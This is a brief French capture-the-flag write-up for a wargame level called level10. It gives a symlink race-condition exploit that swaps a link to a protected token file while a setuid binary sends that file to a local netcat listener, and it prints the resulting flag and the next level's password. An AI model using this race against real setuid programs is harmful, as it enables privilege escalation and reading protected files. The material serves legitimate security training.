# Pré requis

aucun

## GET Flag

Il suffit de lancer ces deux commandes : 
```
chmod 777 . && touch a
(while true; do ln -sf a b; ln -sf token b; done)&
while true; do ./level10 b 127.0.0.1; done
```

Ensuite sur un nouveau shell il faut lancer cette commande :
`while true; do nc -l 6969; done`
# Flag

On obtient le flag:`woupa2yuojeeaaed06riuj63c`
On peut se connecter a flag10 et lancer la commande getflag pour obtenir le flag: `feulo4b72j7edeahuete3no7c`

On peut se connecter a level11.
```
level11
feulo4b72j7edeahuete3no7c
```
